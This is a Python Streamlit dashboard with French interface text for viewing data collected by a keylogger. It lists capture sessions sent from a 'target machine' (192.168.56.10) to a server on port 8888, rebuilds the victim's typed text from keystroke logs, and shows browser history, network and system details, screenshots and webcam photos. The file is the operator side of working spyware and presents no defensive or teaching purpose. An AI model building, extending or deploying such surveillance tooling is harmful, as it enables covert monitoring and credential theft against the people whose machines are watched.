import streamlit as st
import pandas as pd
import os
from collections import Counter
import re
from datetime import datetime
import streamlit as st
import pandas as pd
import plotly.express as px
from pathlib import Path
import time
import json
import threading

from login import require_auth
require_auth()
# Configuration de la page
st.set_page_config(
    page_title="Keylogger Dashboard",
    page_icon="🔍",
    layout="wide",
    initial_sidebar_state="expanded"
)

class FixedDashboard:
    def __init__(self):
        self.data_dir = Path.home() / 'received_data'
    
    def get_sessions(self):
        """Retourne les sessions disponibles"""
        sessions = []
        if self.data_dir.exists():
            for item in self.data_dir.iterdir():
                if item.is_dir() and item.name.startswith('data_'):
                    sessions.append(item)
        return sorted(sessions, reverse=True)
    
    def display_dashboard(self):
        """Affiche le tableau de bord principal"""
        st.title("🔍 Keylogger Dashboard - Surveillance en Temps Réel")
        
        # Auto-rafraîchissement
        refresh_rate = st.sidebar.selectbox("🔄 Rafraîchissement", [2, 5, 10, 30], index=1)
        
        if st.sidebar.button("🔄 Rafraîchir Maintenant"):
            st.rerun()
        
        sessions = self.get_sessions()
        
        # Métriques
        col1, col2, col3, col4 = st.columns(4)
        
        with col1:
            st.metric("Sessions", len(sessions))
        with col2:
            total_files = sum(len(list(s.rglob('*'))) for s in sessions)
            st.metric("Fichiers", total_files)
        with col3:
            if sessions:
                latest = sessions[0]
                st.metric("Dernière", latest.name.replace('data_', ''))
            else:
                st.metric("Dernière", "---")
        with col4:
            st.metric("Statut", "🟢 Actif" if sessions else "🟡 En attente")
        
        if not sessions:
            st.warning("📭 Aucune donnée reçue pour le moment")
            st.info("""
            **Instructions:**
            1. ✅ Le serveur doit être démarré sur le port 8888
            2. ✅ La machine cible (192.168.56.10) doit envoyer des données
            3. 🔄 Les données apparaîtront ici automatiquement
            
            **Dernier statut:** Serveur en écoute, en attente de connexion...
            """)
            time.sleep(refresh_rate)
            st.rerun()
            return
        
        # Sélection de session
        session_names = [f"{s.name} ({len(list(s.rglob('*')))} fichiers)" for s in sessions]
        selected = st.selectbox("📂 Choisir une session à analyser:", session_names)
        session_index = session_names.index(selected)
        session_path = sessions[session_index]
        
        # Affichage des données
        self.display_session_data(session_path)
        
        # Auto-rafraîchissement
        time.sleep(refresh_rate)
        st.rerun()
    
    def display_session_data(self, session_path):
        """Affiche les données d'une session"""
        st.markdown("---")
        
        # Création des onglets
        tabs = st.tabs(["📋 Vue d'ensemble", "⌨ Logs Clavier", "🌐 Réseau", "💻 Système", "🔍 Navigateur", "🖼 Médias"])
        
        with tabs[0]:
            self.display_overview(session_path)
        with tabs[1]:
            self.display_key_logs(session_path)
        with tabs[2]:
            self.display_network_info(session_path)
        with tabs[3]:
            self.display_system_info(session_path)
        with tabs[4]:
            self.display_browser_info(session_path)
        with tabs[5]:
            self.display_media(session_path)
    
    def display_overview(self, session_path):
        """Aperçu de la session"""
        files = list(session_path.rglob('*'))
        
        st.subheader("📊 Statistiques de la Session")
        
        # Comptage par type
        txt_files = [f for f in files if f.suffix == '.txt']
        image_files = [f for f in files if f.suffix in ['.png', '.jpg', '.jpeg']]
        audio_files = [f for f in files if f.suffix in ['.mp4', '.wav']]
        other_files = [f for f in files if f.suffix not in ['.txt', '.png', '.jpg', '.jpeg', '.mp4', '.wav']]
        
        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric("Textes", len(txt_files))
        with col2:
            st.metric("Images", len(image_files))
        with col3:
            st.metric("Audio", len(audio_files))
        with col4:
            st.metric("Autres", len(other_files))
        
        # Structure des dossiers
        st.subheader("📁 Structure des Fichiers")
        for file in sorted(files):
            if file.is_file():
                relative_path = file.relative_to(session_path)
                size = file.stat().st_size
                
                # Icônes selon le type
                if file.suffix == '.txt':
                    icon = "📄"
                elif file.suffix in ['.png', '.jpg']:
                    icon = "🖼"
                elif file.suffix in ['.mp4', '.wav']:
                    icon = "🎵"
                else:
                    icon = "📁"
                
                st.write(f"{icon} `{relative_path}` ({size} octets)")
    
    def read_file(self, file_path):
        """Lit un fichier avec gestion d'erreur"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except Exception as e:
            return f"❌ Erreur lecture: {e}"
    
    def display_key_logs(self, session_path):
        """Affiche les logs clavier"""
        key_files = list(session_path.rglob('*key_log*'))
        if not key_files:
            st.warning("Aucun fichier de logs clavier trouvé")
            return
        
        content = self.read_file(key_files[0])
        
        # Parsing basique des logs
        lines = content.split('\n')
        st.metric("Lignes de log", len(lines))
        
        # Reconstruction du texte
        st.subheader("📝 Texte Reconstitué")
        typed_text = []
        for line in lines:
            if ':' in line:
                try:
                    _, key_event = line.split(':', 1)
                    key_clean = self.clean_key(key_event.strip())
                    
                    if key_clean and len(key_clean) == 1:
                        typed_text.append(key_clean)
                    elif key_clean == 'SPACE':
                        typed_text.append(' ')
                    elif key_clean == 'ENTER':
                        typed_text.append('\n')
                except:
                    pass
        
        reconstructed = ''.join(typed_text)
        if reconstructed:
            st.text_area("Texte tapé", reconstructed, height=200)
        else:
            st.info("Aucun texte reconstituable")
        
        # Dernières activités
        st.subheader("⏰ Dernières Touches")
        recent_lines = lines[-20:] if len(lines) > 20 else lines
        for line in recent_lines:
            st.text(line)
    
    def clean_key(self, key_event):
        """Nettoie les événements clavier"""
        special_keys = {
            'Key.space': 'SPACE', 'Key.enter': 'ENTER', 'Key.backspace': 'BACKSPACE',
            'Key.tab': 'TAB', 'Key.esc': 'ESC'
        }
        return special_keys.get(key_event, key_event)
    
    def display_network_info(self, session_path):
        """Affiche les infos réseau"""
        network_files = list(session_path.rglob('*network*'))
        if not network_files:
            st.warning("Aucune information réseau trouvée")
            return
        
        content = self.read_file(network_files[0])
        st.text_area("Informations Réseau", content, height=400)
    
    def display_system_info(self, session_path):
        """Affiche les infos système"""
        system_files = list(session_path.rglob('*system*'))
        if not system_files:
            st.warning("Aucune information système trouvée")
            return
        
        content = self.read_file(system_files[0])
        st.text_area("Informations Système", content, height=400)
    
    def display_browser_info(self, session_path):
        """Affiche l'historique navigateur"""
        browser_files = list(session_path.rglob('*browser*'))
        if not browser_files:
            st.warning("Aucun historique navigateur trouvé")
            return
        
        content = self.read_file(browser_files[0])
        
        try:
            data = json.loads(content)
            if isinstance(data, list) and len(data) >= 3:
                st.subheader("👤 Utilisateur")
                st.write(data[0])
                
                st.subheader("🗃 Bases de données")
                for path in data[1]:
                    st.write(f"- {path}")
                
                st.subheader("🌐 Historique")
                for browser, history in data[2].items():
                    with st.expander(f"{browser} ({len(history)} entrées)"):
                        for entry in history[:10]:
                            st.write(f"- {entry}")
            else:
                st.text_area("Données brutes", content, height=400)
        except:
            st.text_area("Données brutes", content, height=400)
    
    def display_media(self, session_path):
        """Affiche les médias"""
        # Images
        images = list(session_path.rglob('*.png')) + list(session_path.rglob('*.jpg'))
        if images:
            st.subheader("🖼 Captures d'écran")
            for image in sorted(images):
                st.image(str(image), caption=image.name, use_container_width=True)
        else:
            st.info("Aucune capture d'écran trouvée")
        
        # Webcam
        webcam_pics = list(session_path.rglob('*webcam*'))
        if webcam_pics:
            st.subheader("📷 Photos Webcam")
            for pic in sorted(webcam_pics):
                st.image(str(pic), caption=pic.name, use_container_width=True)
        else:
            st.info("Aucune photo webcam trouvée")

def main():
    dashboard = FixedDashboard()
    dashboard.display_dashboard()

if __name__ == '__main__':
    main()